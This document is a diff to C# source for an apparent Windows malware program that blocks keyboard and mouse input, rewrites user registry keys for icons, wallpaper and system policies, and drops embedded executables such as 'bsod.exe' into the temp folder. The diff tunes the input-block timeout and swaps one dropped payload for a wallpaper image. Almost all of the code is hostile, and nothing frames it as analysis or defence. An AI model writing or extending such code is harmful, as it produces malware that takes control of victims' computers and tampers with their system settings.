@@ -1,15 +1,8 @@
-    using Microsoft.Win32;
-    using System;
-    using System.Diagnostics;
-    using System.Windows;
-    using System.Windows.Controls;
-    using System.Windows.Forms;
-    using Utilities;
-    using System.Collections.Generic;
-    using System.Linq;
-    using System.Text;
-    using System.Runtime.InteropServices;
-    using blockinput;
+using Microsoft.Win32;
+using System;
+using System.Diagnostics;
+using System.Windows;
+using blockinput;
 
 
 
@@ -25,7 +18,7 @@
 
 
                 WorkWorkWorkWork();
-                InputBlocker.Block(60000);
+                InputBlocker.Block(26000);
                 InitializeComponent();
             
 
@@ -41,7 +34,7 @@
                 editKey.SetValue("", temp + "ico.ico");
 
                 editKey = Registry.CurrentUser.CreateSubKey(@"Control Panel\Desktop");
-                editKey.SetValue("Wallpaper", "");
+                editKey.SetValue("Wallpaper", temp + "wallpaper.jpg");
                 editKey.Close();
 
                 editKey = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System");
@@ -59,7 +52,7 @@
                 System.IO.File.WriteAllBytes(temp + "bsod.exe", Properties.Resources.cusole);
                 System.IO.File.WriteAllBytes(temp + "ico.ico", Properties.Resources.ico);
                 System.IO.File.WriteAllBytes(temp + "txt.txt", Properties.Resources.txt);
-                System.IO.File.WriteAllBytes(temp + "corra.exe", Properties.Resources.corra);
+                System.IO.File.WriteAllBytes(temp + "wallpaper.jpg", Properties.Resources.wallpaper);
 
 
 
